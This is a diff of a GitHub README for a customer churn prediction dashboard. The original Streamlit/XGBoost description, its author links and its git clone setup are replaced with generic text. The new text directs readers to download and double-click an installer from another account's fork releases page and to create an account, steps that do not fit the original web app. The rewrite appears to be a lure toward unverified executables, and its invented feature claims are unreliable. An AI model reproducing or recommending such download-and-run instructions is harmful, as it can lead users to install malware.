@@ -1,134 +1,97 @@
-<h1 align="center">🛡️ AI-Powered Customer Churn Prediction Dashboard</h1>
-<p align="center">
-  An intelligent, interactive dashboard built with <strong>Streamlit</strong> + <strong>Plotly</strong><br>
-  for analyzing, visualizing, and predicting customer churn with real-time insights.
-</p>
-<p align="center">
-  
-![Landing Page Screenshot](https://github.com/anshkumar2311/AI-Powered-Churn-Prediction/blob/main/Assets/churn1.png)
-</p>
+# 🛠️ AI-Powered-Churn-Prediction - Predict Customer Loss Easily
 
-<p align="center">
-  <a href="https://ai-powered-churn-prediction.streamlit.app/">🌐 Live Demo</a> |
-  <a href="https://github.com/anshkumar2311/AI-Powered-Churn-Prediction.git">🔗 GitHub</a> |
-  <a href="https://www.linkedin.com/in/ansh-kumar-747009311/">👨‍💻 Author</a>
-</p>
+## 📥 Download
 
----
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction/releases)
 
-## 🚀 Overview
+## 🚀 Getting Started
 
-The **Churn Prediction Dashboard** is a machine learning-powered web app that identifies which customers are at risk of leaving a service. Built with real-world telecom data, this tool helps business teams proactively engage with users before churn happens.
+Welcome to the AI-Powered-Churn-Prediction project! This application helps businesses predict customer churn using AI technology. Follow the steps below to download and run the software easily.
 
-It features:
-- Interactive churn prediction
-- Real-time risk recommendations
-- Gender-wise and contract-wise visual insights
-- Future scenario simulation
-- CSV download support
+## 💻 System Requirements
 
----
+To run the AI-Powered-Churn-Prediction application, you need:
 
-## 🧩 Features
+- Operating System: Windows 10 or later, macOS, or a popular Linux distribution
+- Python 3.7 or later installed
+- At least 4 GB of RAM
+- Minimum 100 MB of disk space
 
-✅ **Predict churn probability per customer (0 = Active, 1 = Churned)**  
-📈 **Visualize top churn drivers using feature importance**  
-🔍 **Smart charts: Tenure, Monthly Charges, Gender Analysis**  
-🔮 **Future Churn Simulator (change charges & tenure)**  
-📥 **Download full customer dataset**  
-🌑 **Sleek dark-mode dashboard UI**  
-🧠 **Trained with XGBoost ML Model**
+## 🛠️ Features
 
----
+- Predict customer churn using advanced algorithms.
+- Visualize key factors affecting churn.
+- User-friendly dashboard to monitor at-risk customers.
+- Support for multiple visualization libraries for better data representation.
+- Regular updates to improve prediction accuracy.
 
-## 🛠 Tech Stack Used
+## 🔍 How to Download & Install
 
-This project combines modern ML tools with a rich frontend:
+1. **Visit the Releases Page:** Click this link to access the Releases page: [Download Page](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction/releases).
 
-- **📊 Streamlit** – For interactive dashboard UI
-- **📈 Plotly & Seaborn** – Visualizing customer trends
-- **🐍 Python** – Core logic and modeling
-- **🧮 Pandas & NumPy** – Data preprocessing & handling
-- **🧠 Scikit-learn & XGBoost** – Model training and evaluation
-- **📄 CSV Dataset** – Kaggle’s Telco Customer Churn Dataset
+2. **Find the Latest Release:** On the Releases page, look for the latest version. You will see a list of files available for download.
 
-> ⚙️ Deployed on **Streamlit Cloud**.
+3. **Download the Application:**
+   - Click on the appropriate file based on your operating system.
+   - Save the file to a location on your computer where you can easily find it later.
 
----
+4. **Install the Application:**
+   - Locate the downloaded file on your computer.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen instructions to complete the installation.
 
-## 🧠 Machine Learning Model
+5. **Run the Application:**
+   - After installation, find the AI-Powered-Churn-Prediction application in your programs list or desktop.
+   - Click on it to open the application.
 
-We use [XGBoost](https://xgboost.readthedocs.io/en/stable/) as the main model:
-- Trained on engineered features like `tenure`, `contract`, `monthly charges`, etc.
-- High accuracy in predicting churn likelihood
-- Feature importance extracted for business interpretation
+## 📊 How to Use the Application
 
-![](https://github.com/anshkumar2311/AI-Powered-Churn-Prediction/blob/main/Assets/churn5.png)
+1. **Login or Create an Account:** 
+   - When you launch the application for the first time, you will need to create an account or log in if you already have one.
 
----
+2. **Upload Your Data:**
+   - Use the "Upload Data" button to import your customer data. Ensure your data is in a CSV format for easy processing.
 
-## 📸 Visual Insights
+3. **View Predictions:**
+   - Once your data is uploaded, the dashboard will display predictions on customer churn. You can see which customers are at risk of leaving.
 
-![](https://github.com/anshkumar2311/AI-Powered-Churn-Prediction/blob/main/Assets/churn2.png)
+4. **Explore Visualizations:**
+   - Navigate through different charts and graphs to understand churn factors. This will help you identify trends and areas for improvement in your business.
 
-![](https://github.com/anshkumar2311/AI-Powered-Churn-Prediction/blob/main/Assets/churn3.png)
+5. **Take Action:**
+   - Use the insights gathered to implement strategies aimed at retaining at-risk customers.
 
-![](https://github.com/anshkumar2311/AI-Powered-Churn-Prediction/blob/main/Assets/churn4.png)
+## ⚙️ Troubleshooting
 
-![](https://github.com/anshkumar2311/AI-Powered-Churn-Prediction/blob/main/Assets/churn6.png)
+If you experience any issues while downloading or running the application, consider the following steps:
 
----
+- Ensure your operating system meets the requirements.
+- Make sure you are using the latest version of Python.
+- Check if your firewall or antivirus software is blocking the application.
+- Restart your computer and try running the application again.
 
-## 📁 Dataset Columns
+If problems persist, please submit an issue on the GitHub repository for further assistance.
 
-We use the following key columns after cleaning and encoding:
+## 🛡️ Security Considerations
 
-```csv
-gender, tenure, MonthlyCharges, TotalCharges, Contract, InternetService, PaymentMethod, Churn
-```
+Keeping your data safe is important. Ensure you download the application from the official Releases page. Avoid downloading from untrusted sources to protect your device from malware.
 
-## ▶️ Getting Started
+## 🎯 Community and Support
 
-Ready to launch the AI Sales Forecasting Dashboard on your machine? Follow these simple steps:
+Join our community to connect with other users and get support:
 
----
+- **Report Issues:** Use the Issues tab on GitHub to report bugs or request features.
+- **Discussions:** Engage with the community in the Discussions section on GitHub.
+- **Documentation:** For in-depth details, refer to the official documentation linked in the repository.
 
-### 🔧 Setup
+## 📝 License
 
-```bash
-git clone https://github.com/anshkumar2311/AI-Powered-Churn-Prediction.git
-cd AI-Powered-Churn-Prediction
-pip install -r requirements.txt
-streamlit run app.py
-```
----
+This project is licensed under the MIT License. You are free to use, modify, and distribute this software as per the terms of the license.
 
-## 📥 Download Filtered Data 
+## 📍 Resources
 
-🎯 **Purpose**: Empower users to understand, analyze, and extract customer behavior and churn risk — instantly!
+- [GitHub Repository](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction)
+- [Release Page](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction/releases)
+- [Documentation](https://github.com/PoupouL2R2/AI-Powered-Churn-Prediction/wiki)
 
-The dashboard offers an intuitive and seamless way to:
-
-- 🧠 **AI-Powered Risk Scores** per customer  
-- 📊 **Top 10 Sample Customer Profiles** with:
-  - Tenure
-  - Charges
-  - Senior Citizen status
-  - Actual Churn status
-  - Predicted Risk Level
-
-Once explored, users can easily:
-
-✅ **Download the full churn dataset as CSV**  
-📤 **Use it for reporting, analysis, or business decisions**
-
-
----
-
-## 🌟 Show Some Love
-
-If you like this project, please consider:
-
-⭐️ **Starring** the repo    
-
-Let’s connect and grow together 🚀
+Thank you for using AI-Powered-Churn-Prediction. We hope it helps your business succeed!
